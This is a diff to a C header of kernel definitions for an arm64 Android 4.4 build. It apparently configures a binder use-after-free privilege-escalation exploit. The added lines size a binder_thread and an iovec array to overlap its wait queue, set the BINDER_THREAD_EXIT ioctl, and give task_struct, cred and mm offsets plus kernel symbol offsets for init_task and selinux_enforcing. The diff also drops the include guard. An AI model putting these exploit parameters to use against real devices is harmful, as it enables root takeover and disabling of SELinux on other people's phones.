@@ -1,4 +1,3 @@
-#ifndef _KERNEL_DEFS__H_
 #define _KERNEL_DEFS__H_
 
 // These definitions can vary across kernel versions/builds. 
@@ -9,9 +8,6 @@
 
 // Offset of wait_queue_head_t (wait) field in binder_thread structure // offsetof(struct binder_thread, wait) = 0xA0
 #define WAITQUEUE_BINDER_THREAD_OFFSET 0xA0
-
-// Size of binder_thread structure in bytes // sizeof(struct binder_thread) = 0x198
-#define BINDER_THREAD_SZ               0x198
 
 // Offset of thread_info structure in task_struct (if not in kstack) // always 0x0
 #define THREAD_INFO_TASK_OFFSET        0x0
@@ -75,4 +71,24 @@
 #define KERNEL_DS                      0xFFFFFFFFFFFFFFFF // -1UL in "arch\arm64\include\asm\uaccess.h"
 #define IS_KERNEL_POINTER(x)           (((x > KERNEL_BASE) && (x < KERNEL_DS))?1:0)
 
-#endif
+#define BINDER_THREAD_EXIT 0x40046208ul
+// NOTE: we don't cover the task_struct* here; we want to leave it uninitialized
+#define BINDER_THREAD_SZ 0x188
+#define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16) //25
+#define WAITQUEUE_OFFSET 0xA0
+#define IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16) //10
+
+// Linux localhost 4.4.177-g83bee1dc48e8 #1 SMP PREEMPT Mon Jul 22 20:12:03 UTC 2019 aarch64
+// data from `pahole` on my own build with the same .config
+
+#define OFFSET__task_struct__thread_info__flags 0
+#define OFFSET__task_struct__mm 0x5D8
+#define OFFSET__task_struct__cred 0x838
+#define OFFSET__mm_struct__user_ns 0x2F8
+#define OFFSET__uts_namespace__name__version 0xC7
+// SYMBOL_* are relative to _head; data from /proc/kallsyms on userdebug
+#define SYMBOL__init_user_ns 0x22A2EB8 // ffffff800a322eb8 D init_user_ns
+#define SYMBOL__init_task 0x2297380 // ffffff800a317380 D init_task
+#define SYMBOL__init_uts_ns 0x2297158 // ffffff800a317158 D init_uts_ns
+
+#define SYMBOL__selinux_enforcing 0x271EC38 // Grant: recovered using droidimg+miasm // ffffff800a79ec38 B selinux_enforcing
